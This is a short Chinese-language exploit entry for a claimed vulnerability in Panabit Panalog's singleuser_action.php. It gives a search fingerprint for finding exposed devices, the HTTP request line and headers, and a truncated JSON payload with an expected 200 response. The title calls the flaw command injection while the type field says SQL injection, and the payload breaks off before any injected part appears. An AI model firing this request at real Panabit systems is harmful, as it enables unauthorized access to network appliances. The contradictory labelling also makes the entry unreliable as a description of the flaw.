# panabitapp_handle存在命令注入漏洞

- **系统**：panabitapp_handle　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="Panabit-Panalog"`
- **请求**：`POST /singleuser_action.php HTTP/1.1`
- **关键头**：`Content-Length: 576`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
{ "syncInfo": { "user": { "userId": "88172765", "userName": "88172765", "employeeId": "88172765", "departmentId": "88172765", "departmentName": "88172765", "coporationId": "88172765", "corporationName": "88172765", "userSex": "1",  "userDuty": "88172765", "userBirthday": "88172765", "userPost": "88172765", "userPostCode": "88172765", "userAlias": "88172765", "userRank": "88172765", "userPhone": "88172765", "userHomeAddress": "88172765", "userMobilePhone": "88172765", "userMailAddress": "88172765", "userMSN": "88172765", "userNt": "88172765", "userCA": "88172765", "userPwd": "88172765", "userCl…（脚本共 1160 字，完整版见原文）
```
- **预期**：200　|　—